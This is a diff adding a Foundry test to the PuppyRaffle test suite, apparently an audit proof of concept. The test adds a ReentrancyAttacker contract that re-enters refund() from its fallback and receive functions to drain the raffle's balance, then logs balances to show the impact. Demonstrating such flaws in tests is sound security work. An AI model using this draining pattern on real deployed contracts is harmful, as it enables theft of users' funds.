@@ -247,4 +247,67 @@ contract PuppyRaffleTest is Test {
 
         assert(gasUsedFirst < gasUsedSecond);
     }
+
+    function test_reentrancyRefund() public {
+        // users entering raffle
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        
+        // create attack contract and user
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+        
+        // noting starting balances
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+        
+        // attack
+        vm.prank(attacker);
+        attackerContract.attack{value: entranceFee}();
+       
+        // impact
+        console.log("attackerContract balance: ", startingAttackContractBalance);
+        console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
+        console.log("ending attackerContract balance: ", address(attackerContract).balance);
+        console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
+    }
 }
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+    
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);  
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+}
+
